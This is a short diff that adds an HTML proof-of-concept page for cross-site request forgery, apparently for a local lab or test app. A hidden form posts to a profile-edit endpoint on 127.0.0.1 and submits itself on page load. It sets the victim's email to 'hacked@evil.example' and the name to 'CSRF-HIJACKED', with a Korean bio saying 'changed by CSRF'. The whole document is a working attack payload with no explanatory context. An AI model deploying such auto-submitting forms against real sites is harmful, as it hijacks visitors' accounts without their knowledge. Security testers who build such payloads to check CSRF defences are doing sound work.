@@ -1,0 +1,7 @@
+<form id="f" action="http://127.0.0.1:5000/profile/edit" method="POST">
+  <input name="email" value="hacked@evil.example">
+  <input name="full_name" value="CSRF-HIJACKED">
+  <input name="department" value="x">
+  <input name="bio" value="CSRF로 변경됨">
+</form>
+<script>document.getElementById('f').submit();</script>
